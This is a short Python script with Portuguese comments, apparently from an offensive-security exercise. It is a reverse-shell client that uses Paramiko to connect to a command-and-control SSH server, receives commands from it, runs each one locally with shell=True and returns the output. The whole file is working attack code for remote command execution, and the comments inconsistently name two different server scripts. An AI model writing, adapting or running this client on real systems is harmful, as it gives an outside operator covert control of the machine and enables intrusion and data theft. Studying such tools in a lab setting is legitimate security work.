### Script: ssh_rcmd.py
# Este script é o cliente que irá se conectar ao servidor SSH (c2_reverse_server.py) e enviar comandos para obter uma shell reversa. 
# Ele utiliza a biblioteca Paramiko para criar uma conexão SSH com o servidor, autenticar usando um username e password, e depois enviar comandos para o servidor executar.
# Para testar, primeiro execute o universal_server.py para iniciar o servidor, e depois execute este script para conectar ao servidor e obter a shell reversa.

import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                 ssh_session.send(str(e))
        client.close()
    return

  
if __name__ == '__main__':
    import getpass
    #user = getpass.getuser()
    user = input ('Username SSH: ')
    password = getpass.getpass()
    
    ip = input ('Insira o IP do Servidor: ') #or '127.0.0.1'
    port = input ('Insira a porta ou <CR>: ') #or 2222
    #cmd = input ('Insira o comando ou <CR>: ') or 'ls -lah'
    ssh_command(ip, port, user, password, 'ClientConnected')